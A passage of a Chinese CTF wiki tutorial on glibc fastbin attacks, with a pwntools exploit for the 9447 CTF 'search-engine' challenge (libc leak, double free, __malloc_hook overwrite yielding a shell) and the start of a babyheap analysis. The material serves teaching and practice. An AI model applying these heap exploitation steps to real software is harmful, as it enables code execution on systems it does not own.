</code></pre></div> <p>可以看出，在每次釋放 i-&gt;sentence_ptr 之前，這個句子的內容就會全部被設置爲 <code>\x00</code> ，由於單詞結構體中存儲的單詞只是句子的一個指針，所以單詞也會被置爲 <code>\x00</code> 。該句子對應的那些單詞仍然是存在於鏈表中的，並沒有被刪除，因此每次搜索單詞的時候，仍然會判斷。看起來由於句子內容被置爲 <code>\x00</code> 可以防止通過 <code>*i-&gt;sentence_ptr</code> 驗證。然而，由於 chunk 被釋放後會被放到 bin 中，當 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的時候，也就有可能會產生 double free 的情況。此外，當句子被 <code>memset</code> 的時候，單詞雖然都變爲了 <code>\x00</code> ，但是我們仍然可以通過兩個 <code>\x00</code> 的比較來繞過 <code>memcmp</code> 的檢測。</p> <h3 id=_23>利用<a class=headerlink href=#_23 title="Permanent link">&para;</a></h3> <h4 id=_24>利用思路<a class=headerlink href=#_24 title="Permanent link">&para;</a></h4> <p>基本利用思路如下</p> <ul> <li>利用 unsorted bin 地址泄漏 libc 基地址</li> <li>利用 double free 構造 fastbin 循環鏈表</li> <li>分配 chunk 到 malloc_hook 附近，修改malloc_hook 爲 one_gadget</li> </ul> <h4 id=libc>泄漏 libc 地址<a class=headerlink href=#libc title="Permanent link">&para;</a></h4> <p>這裏我們分配一個 small bin 大小的 chunk ，當它被釋放後，就會放入到 unsorted bin 中。因而，只要 <code>unsorted bin</code> 的地址的起始字節不是 <code>\x00</code> 便可以通過驗證。同時，我們可以構造 <code>\x00</code> 來進行比較，從而通過驗證。具體如下</p> <div class=highlight><pre><span></span><code><span class=k>def</span><span class=w> </span><span class=nf>leak_libc</span><span class=p>():</span>
    <span class=n>smallbin_sentence</span> <span class=o>=</span> <span class=s1>&#39;s&#39;</span> <span class=o>*</span> <span class=mh>0x85</span> <span class=o>+</span> <span class=s1>&#39; m &#39;</span>
    <span class=n>index_sentence</span><span class=p>(</span><span class=n>smallbin_sentence</span><span class=p>)</span>
    <span class=n>search_word</span><span class=p>(</span><span class=s1>&#39;m&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;y&#39;</span><span class=p>)</span>
    <span class=n>search_word</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Found &#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>smallbin_sentence</span><span class=p>))</span> <span class=o>+</span> <span class=s1>&#39;: &#39;</span><span class=p>)</span>
    <span class=n>unsortedbin_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;n&#39;</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>unsortedbin_addr</span>
</code></pre></div> <h4 id=fastbin>構造 fastbin 循環鏈表<a class=headerlink href=#fastbin title="Permanent link">&para;</a></h4> <p>由於我們最後希望在 malloc_hook 處分配 chunk，而一般分配 malloc_hook 附近的 chunk 一般大小都是0x7f。即，我們所需要設置的設置的 fast bin 的數據字節部分的大小爲 0x60。這裏我們按照如下方式構造</p> <ol> <li>分別索引句子a，索引句子b，索引句子c，則此時單詞鏈表中索引的句子的相對順序爲c-&gt;b-&gt;a。假設句子 a 爲'a' * 0x5d+' d '，句子 b 爲 'b' * 0x5d+' d '，句子c類似。</li> <li>索引單詞d，三個均刪除，則此時 fastbin 中的鏈表情況爲 a-&gt;b-&gt;c-&gt;NULL，這是因爲首先釋放的是句子c，最後釋放的是句子 a 。這時，搜索單詞時<code>*i-&gt;sentence_ptr</code> 對於a, b 來說都是可以繞過的。</li> <li>我們此時再次刪除搜索單詞 <code>\x00</code>。首先遍歷的是 c，但是 c 的驗證不通過；其次遍歷的是b，驗證通過，我們將其釋放；其次遍歷的是a，驗證通過，但是我們不刪除。則此時 fastbin 的情況爲 b-&gt;a-&gt;b-&gt;a-&gt;...。即已經構成了double free b的情況。由於我們先前爲了 leak libc 還建立一個句子，所以還有一個單詞可以比較，這裏我們也不刪除。</li> </ol> <p>具體代碼如下</p> <div class=highlight><pre><span></span><code>    <span class=c1># 2. create cycle fastbin 0x70 size</span>
    <span class=n>index_sentence</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x5d</span> <span class=o>+</span> <span class=s1>&#39; d &#39;</span><span class=p>)</span>  <span class=c1>#a</span>
    <span class=n>index_sentence</span><span class=p>(</span><span class=s1>&#39;b&#39;</span> <span class=o>*</span> <span class=mh>0x5d</span> <span class=o>+</span> <span class=s1>&#39; d &#39;</span><span class=p>)</span>  <span class=c1>#b</span>
    <span class=n>index_sentence</span><span class=p>(</span><span class=s1>&#39;c&#39;</span> <span class=o>*</span> <span class=mh>0x5d</span> <span class=o>+</span> <span class=s1>&#39; d &#39;</span><span class=p>)</span>  <span class=c1>#c</span>

    <span class=c1># a-&gt;b-&gt;c-&gt;NULL</span>
    <span class=n>search_word</span><span class=p>(</span><span class=s1>&#39;d&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;y&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;y&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;y&#39;</span><span class=p>)</span>

    <span class=c1># b-&gt;a-&gt;b-&gt;a-&gt;...</span>
    <span class=n>search_word</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;y&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;n&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;n&#39;</span><span class=p>)</span>
</code></pre></div> <p>效果如下</p> <div class=highlight><pre><span></span><code>pwndbg&gt;<span class=w> </span>fastbins
fastbins
0x20:<span class=w> </span>0x0
0x30:<span class=w> </span>0x1d19320<span class=w> </span>◂—<span class=w> </span>0x0
0x40:<span class=w> </span>0x0
0x50:<span class=w> </span>0x0
0x60:<span class=w> </span>0x0
0x70:<span class=w> </span>0x1d191b0<span class=w> </span>—▸<span class=w> </span>0x1d19010<span class=w> </span>—▸<span class=w> </span>0x1d191b0<span class=w> </span>◂—<span class=w> </span>0x1d19010
0x80:<span class=w> </span>0x0
</code></pre></div> <h4 id=malloc_hook-chunk>分配 malloc_hook 附近chunk<a class=headerlink href=#malloc_hook-chunk title="Permanent link">&para;</a></h4> <p>此時，fastbin 的鏈表爲 b-&gt;a-&gt;b-&gt;a-&gt;…，則我們可以在申請第一個相同大小的 chunk 時，設置 b 的 fd 爲 malloc_hook 附近處的 chunk <code>0x7fd798586aed</code>（這裏是舉一個例子，代碼中需使用相對地址）。</p> <div class=highlight><pre><span></span><code>pwndbg&gt;<span class=w> </span>print<span class=w> </span><span class=o>(</span>void*<span class=o>)</span><span class=p>&amp;</span>main_arena
<span class=nv>$1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>(</span>void<span class=w> </span>*<span class=o>)</span><span class=w> </span>0x7fd798586b20<span class=w> </span>&lt;main_arena&gt;
pwndbg&gt;<span class=w> </span>x/8gx<span class=w> </span>0x7fd798586b20-16
0x7fd798586b10<span class=w> </span>&lt;__malloc_hook&gt;:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
0x7fd798586b20<span class=w> </span>&lt;main_arena&gt;:<span class=w>    </span>0x0000000000000000<span class=w>  </span>0x0000000000bce130
0x7fd798586b30<span class=w> </span>&lt;main_arena+16&gt;:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
0x7fd798586b40<span class=w> </span>&lt;main_arena+32&gt;:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
pwndbg&gt;<span class=w> </span>find_fake_fast<span class=w> </span>0x7fd798586b10<span class=w> </span>0x7f
FAKE<span class=w> </span>CHUNKS
0x7fd798586aed<span class=w> </span>PREV_INUSE<span class=w> </span>IS_MMAPED<span class=w> </span>NON_MAIN_ARENA<span class=w> </span><span class=o>{</span>
<span class=w>  </span><span class=nv>prev_size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>15535264025435701248</span>,
<span class=w>  </span><span class=nv>size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>127</span>,
<span class=w>  </span><span class=nv>fd</span><span class=w> </span><span class=o>=</span><span class=w> </span>0xd798247e20000000,
<span class=w>  </span><span class=nv>bk</span><span class=w> </span><span class=o>=</span><span class=w> </span>0xd798247a0000007f,
<span class=w>  </span><span class=nv>fd_nextsize</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x7f,
<span class=w>  </span><span class=nv>bk_nextsize</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
<span class=o>}</span>
pwndbg&gt;<span class=w> </span>print<span class=w> </span>/x<span class=w> </span>0x7fd798586b10-0x7fd798586aed
<span class=nv>$2</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x23
pwndbg&gt;<span class=w> </span>print<span class=w> </span>/x<span class=w> </span>0x7fd798586b20-0x7fd798586aed
<span class=nv>$3</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x33
</code></pre></div> <p>那麼當再次分配 b 的時候，由於此時 b 的 fd 已經被我們修改爲了malloc_hook附近的地址，所以這時候我們再次分配一個 chunk，就會指向 <code>0x7fd798586aed</code>。 此後便只需要將 malloc_hook 修改爲 one_gadget 地址就可以拿到 shell 了。</p> <div class=highlight><pre><span></span><code>    <span class=c1># 3. fastbin attack to malloc_hook nearby chunk</span>
    <span class=n>fake_chunk_addr</span> <span class=o>=</span> <span class=n>main_arena_addr</span> <span class=o>-</span> <span class=mh>0x33</span>
    <span class=n>fake_chunk</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_chunk_addr</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span> <span class=s1>&#39;f&#39;</span><span class=p>)</span>

    <span class=n>index_sentence</span><span class=p>(</span><span class=n>fake_chunk</span><span class=p>)</span>

    <span class=n>index_sentence</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x60</span><span class=p>)</span>

    <span class=n>index_sentence</span><span class=p>(</span><span class=s1>&#39;b&#39;</span> <span class=o>*</span> <span class=mh>0x60</span><span class=p>)</span>

    <span class=n>one_gadget_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0xf02a4</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x13</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>one_gadget_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span> <span class=s1>&#39;f&#39;</span><span class=p>)</span>
    <span class=c1>#gdb.attach(p)</span>
    <span class=n>index_sentence</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>這裏可能需要多選擇幾個 one_gadget 地址，因爲 one_gadget 成功是有條件的。</p> <h4 id=shell>shell<a class=headerlink href=#shell title="Permanent link">&para;</a></h4> <div class=highlight><pre><span></span><code>➜<span class=w>  </span>2015_9447ctf_search-engine<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>python<span class=w> </span>exp.py
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>Canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x400000<span class=o>)</span>
<span class=w>    </span>FORTIFY:<span class=w>  </span>Enabled
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./search&#39;</span>:<span class=w> </span>pid<span class=w> </span><span class=m>31158</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>PID:<span class=w> </span><span class=m>31158</span>
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>unsortedbin<span class=w> </span>addr:<span class=w> </span>0x7f802e73bb78
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>libc<span class=w> </span>base<span class=w> </span>addr:<span class=w> </span>0x7f802e377000
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
Enter<span class=w> </span>the<span class=w> </span>sentence:
$<span class=w> </span>ls
exp.py<span class=w>       </span>search<span class=w>      </span>search.id1<span class=w>  </span>search.nam
libc.so.6<span class=w>  </span>search.id0<span class=w>  </span>search.id2<span class=w>  </span>search.til
</code></pre></div> <p>當然，這裏還有一種<a href=https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/ >方法</a>，將 chunk 分配到棧上。</p> <h2 id=2017-0ctf-babyheap>2017 0ctf babyheap<a class=headerlink href=#2017-0ctf-babyheap title="Permanent link">&para;</a></h2> <p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap>題目鏈接</a></p> <h3 id=_25>基本信息<a class=headerlink href=#_25 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>➜<span class=w>  </span>2017_0ctf_babyheap<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>file<span class=w> </span>babyheap
babyheap:<span class=w> </span>ELF<span class=w> </span><span class=m>64</span>-bit<span class=w> </span>LSB<span class=w> </span>shared<span class=w> </span>object,<span class=w> </span>x86-64,<span class=w> </span>version<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span>SYSV<span class=o>)</span>,<span class=w> </span>dynamically<span class=w> </span>linked,<span class=w> </span>interpreter<span class=w> </span>/lib64/ld-linux-x86-64.so.2,<span class=w> </span><span class=k>for</span><span class=w> </span>GNU/Linux<span class=w> </span><span class=m>2</span>.6.32,<span class=w> </span>BuildID<span class=o>[</span>sha1<span class=o>]=</span>9e5bfa980355d6158a76acacb7bda01f4e3fc1c2,<span class=w> </span>stripped
➜<span class=w>  </span>2017_0ctf_babyheap<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>checksec<span class=w> </span>babyheap
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2017_0ctf_babyheap/babyheap&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
<span class=w>    </span>RELRO:<span class=w>    </span>Full<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>Canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>PIE<span class=w> </span>enabled
</code></pre></div> <p>64位程序，保護全部開啓。</p> <h3 id=_26>基本功能<a class=headerlink href=#_26 title="Permanent link">&para;</a></h3> <p>程序是一個堆分配器，主要由以下四種功能</p> <div class=highlight><pre><span></span><code><span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;1. Allocate&quot;</span><span class=p>);</span>
<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;2. Fill&quot;</span><span class=p>);</span>
<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;3. Free&quot;</span><span class=p>);</span>
<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;4. Dump&quot;</span><span class=p>);</span>
<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;5. Exit&quot;</span><span class=p>);</span>
<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Command: &quot;</span><span class=p>);</span>
</code></pre></div> <p>其中，每次讀取命令的函數由讀取指定長度的字符串的函數而決定。</p> <p>通過分配函數</p> <div class=highlight><pre><span></span><code><span class=kt>void</span><span class=w> </span><span class=kr>__fastcall</span><span class=w> </span><span class=n>allocate</span><span class=p>(</span><span class=kr>__int64</span><span class=w> </span><span class=n>a1</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>  </span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+10h] [rbp-10h]</span>
<span class=w>  </span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>v2</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+14h] [rbp-Ch]</span>
<span class=w>  </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>v3</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+18h] [rbp-8h]</span>

<span class=w>  </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=mi>15</span><span class=p>;</span><span class=w> </span><span class=o>++</span><span class=n>i</span><span class=w> </span><span class=p>)</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=o>!*</span><span class=p>(</span><span class=n>_DWORD</span><span class=w> </span><span class=o>*</span><span class=p>)(</span><span class=mf>24L</span><span class=n>L</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>a1</span><span class=p>)</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Size: &quot;</span><span class=p>);</span>
<span class=w>      </span><span class=n>v2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_num</span><span class=p>();</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v2</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v2</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>4096</span><span class=w> </span><span class=p>)</span>
<span class=w>          </span><span class=n>v2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>4096</span><span class=p>;</span>
<span class=w>        </span><span class=n>v3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>calloc</span><span class=p>(</span><span class=n>v2</span><span class=p>,</span><span class=w> </span><span class=mi>1uLL</span><span class=p>);</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=o>!</span><span class=n>v3</span><span class=w> </span><span class=p>)</span>
<span class=w>          </span><span class=n>exit</span><span class=p>(</span><span class=mi>-1</span><span class=p>);</span>
<span class=w>        </span><span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span><span class=w> </span><span class=o>*</span><span class=p>)(</span><span class=mf>24L</span><span class=n>L</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>a1</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
<span class=w>        </span><span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span><span class=w> </span><span class=o>*</span><span class=p>)(</span><span class=n>a1</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mf>24L</span><span class=n>L</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>8</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v2</span><span class=p>;</span>
<span class=w>        </span><span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span><span class=w> </span><span class=o>*</span><span class=p>)(</span><span class=n>a1</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mf>24L</span><span class=n>L</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>16</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v3</span><span class=p>;</span>
<span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Allocate Index %d</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>i</span><span class=p>);</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>      </span><span class=k>return</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>  </span><span class=p>}</span>
<span class=p>}</span>
</code></pre></div> <p>申請的 chunk 的最大爲 4096。此外，我們可以看出每個 chunk 主要有三個字段：是否在使用，堆塊大小，堆塊位置。故而我們可以創建對應的結構體。</p> <div class=highlight><pre><span></span><code>00000000 chunk           struc ; (sizeof=0x18, mappedto_6)
00000000 inuse           dq ?
00000008 size            dq ?
00000010 ptr             dq ?
00000018 chunk           ends
</code></pre></div> <p><strong>需要注意的是堆塊是由 calloc 分配的，所以 chunk 中的內容全都爲<code>\x00</code>。</strong></p> <p>在填充內容的功能中，使用讀取內容的函數是直接讀取指定長度的內容，並沒有設置字符串結尾。<strong>而且比較有意思的是，這個指定長度是我們指定的，並不是之前 chunk 分配時指定的長度，所以這裏就出現了任意堆溢出的情形。</strong></p> <div class=highlight><pre><span></span><code><span class=kr>__int64</span><span class=w> </span><span class=kr>__fastcall</span><span class=w> </span><span class=n>fill</span><span class=p>(</span><span class=n>chunk</span><span class=w> </span><span class=o>*</span><span class=n>a1</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>result</span><span class=p>;</span><span class=w> </span><span class=c1>// rax</span>
<span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>v2</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+18h] [rbp-8h]</span>
<span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>v3</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+1Ch] [rbp-4h]</span>

<span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Index: &quot;</span><span class=p>);</span>
<span class=w>  </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_num</span><span class=p>();</span>
<span class=w>  </span><span class=n>v2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>result</span><span class=p>;</span>
<span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=p>(</span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=mi>15</span><span class=w> </span><span class=p>)</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>LODWORD</span><span class=p>(</span><span class=n>a1</span><span class=p>[(</span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=p>].</span><span class=n>inuse</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>result</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Size: &quot;</span><span class=p>);</span>
<span class=w>      </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_num</span><span class=p>();</span>
<span class=w>      </span><span class=n>v3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>result</span><span class=p>;</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=p>(</span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Content: &quot;</span><span class=p>);</span>
<span class=w>        </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_content</span><span class=p>((</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>a1</span><span class=p>[</span><span class=n>v2</span><span class=p>].</span><span class=n>ptr</span><span class=p>,</span><span class=w> </span><span class=n>v3</span><span class=p>);</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>  </span><span class=p>}</span>
<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>result</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div> <p>在釋放chunk的功能中該設置的都設置了。</p> <div class=highlight><pre><span></span><code><span class=kr>__int64</span><span class=w> </span><span class=kr>__fastcall</span><span class=w> </span><span class=n>free_chunk</span><span class=p>(</span><span class=n>chunk</span><span class=w> </span><span class=o>*</span><span class=n>a1</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>result</span><span class=p>;</span><span class=w> </span><span class=c1>// rax</span>
<span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>v2</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+1Ch] [rbp-4h]</span>

<span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Index: &quot;</span><span class=p>);</span>
<span class=w>  </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_num</span><span class=p>();</span>
<span class=w>  </span><span class=n>v2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>result</span><span class=p>;</span>
